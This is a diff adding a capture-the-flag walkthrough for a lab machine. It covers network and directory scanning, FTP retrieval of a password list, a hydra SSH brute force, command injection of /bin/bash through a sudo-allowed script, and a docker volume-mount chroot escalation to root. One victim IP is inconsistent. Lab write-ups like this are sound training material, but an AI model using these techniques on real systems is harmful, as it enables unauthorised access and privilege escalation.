@@ -1,0 +1,33 @@
+Run `ip a` on Kali Linux to check the attacker IP address.
+Run `nmap -sn 192.168.0.55/24` to identify the victim IP address.
+Run `gobuster dir -u http://192.168.0.15/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` to scan the victim directories.
+After running, you should see `/hidden_text` in the list.
+Type `192.168.0.55/hidden_text` and you will see a maintenance page. Click **“Thank you…”** and it will redirect you to a QR code.
+Scan the QR code to get the hidden text and credentials.
+Connect to FTP using `ftp 192.168.0.55`.
+Run `ls -la` to list all files.
+Download all files such as `information.txt` and `p_lists.txt` using:
+`get information.txt`
+`get p_lists.txt`
+Then exit FTP.
+Chck the current user by running `cat information.txt` and you will see the user is Robin.
+Find Robin’s password by running `hydra -l robin -P p_lists.txt 192.168.0.55 ssh`.
+(The `p_lists.txt` file contains a list of passwords.)
+After getting the password, login as Robin using `ssh robin@192.168.0.55`.
+Once logged in, check what you can run as Robin using `sudo -l`.
+This will show that you can switch to user Jerry without a password.
+Exploit `feedback.sh` as Jerry by running:
+`sudo -u jerry /home/robin/project/feedback.sh`
+Then enter:
+* name: any name
+* feedback: `/bin/bash`
+If nothing shows, it means it worked.
+Then type `whoami` to confirm you are Jerry.
+Run `ls -la` to list all files.
+Get `user.txt` by running `cat /home/jerry/user.txt`.
+Exploit root using:
+`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
+Go to root directory using `cd /root`.
+List files using `ls`.
+Read `root.txt`.
+
